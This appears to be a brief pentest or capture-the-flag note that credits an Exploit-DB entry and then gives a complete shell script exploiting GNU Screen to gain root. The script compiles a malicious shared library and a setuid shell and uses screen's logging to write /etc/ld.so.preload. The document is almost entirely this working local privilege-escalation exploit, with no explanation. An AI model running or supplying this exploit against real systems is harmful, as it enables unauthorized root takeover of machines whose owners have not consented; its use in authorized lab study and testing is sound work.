Thanks to: https://www.exploit-db.com/exploits/41154

![](Images/Pasted%20image%2020250213102453.png)

```shell
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshelll", 0, 0);
    chmod("/tmp/rootshelll", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc-9 -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c # Change gcc path if needed
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshelll.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc-9 -o /tmp/rootshelll /tmp/rootshelll.c # Change gcc path if needed
rm -f /tmp/rootshelll.c
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshelll
```